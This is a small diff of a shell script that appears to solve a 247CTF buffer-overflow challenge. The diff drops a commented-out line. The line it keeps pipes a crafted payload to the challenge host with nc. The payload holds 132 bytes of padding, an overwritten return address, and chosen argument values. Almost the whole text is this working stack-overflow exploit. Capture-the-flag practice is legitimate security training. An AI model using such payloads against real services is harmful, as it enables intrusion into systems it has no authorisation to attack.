@@ -7,5 +7,4 @@
 # Padding: 0 #
 # Total: 132 #
 
-# echo -ne "\x78\x56\x34\x12\x47\x02\x00\x00\x37\x13\x00\x00" > /dev/null
 echo -ne "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb\x76\x85\x04\x08bbbb\x37\x13\x00\x00\x47\x02\x00\x00\x78\x56\x34\x12\n" | nc a0a90fb28e9f66b3.247ctf.com 50234
